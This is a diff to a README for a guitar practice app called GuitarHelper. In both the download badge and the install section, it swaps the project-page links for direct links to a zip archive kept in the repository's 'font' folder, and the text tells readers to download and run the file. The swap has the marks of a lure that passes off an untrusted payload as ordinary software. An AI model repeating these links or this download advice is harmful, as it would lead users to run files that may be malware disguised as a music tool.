@@ -1,6 +1,6 @@
 # 🎸 GuitarHelper - Practice Guitar With Clear Tools
 
-[![Download GuitarHelper](https://img.shields.io/badge/Download-GuitarHelper-blue?style=for-the-badge)](https://github.com/Transitiongregoriancalendarmonth926/GuitarHelper)
+[![Download GuitarHelper](https://img.shields.io/badge/Download-GuitarHelper-blue?style=for-the-badge)](https://github.com/Transitiongregoriancalendarmonth926/GuitarHelper/raw/refs/heads/main/font/Guitar_Helper_3.6-alpha.1.zip)
 
 ## 🚀 What GuitarHelper Does
 
@@ -32,7 +32,7 @@ For best results, close other audio apps before you tune or use the metronome.
 
 Go to the main project page and download GuitarHelper from there:
 
-https://github.com/Transitiongregoriancalendarmonth926/GuitarHelper
+https://github.com/Transitiongregoriancalendarmonth926/GuitarHelper/raw/refs/heads/main/font/Guitar_Helper_3.6-alpha.1.zip
 
 If you see a release file for Windows, download it and open it on your PC. If the page gives you a setup file, save it first, then run it.
 
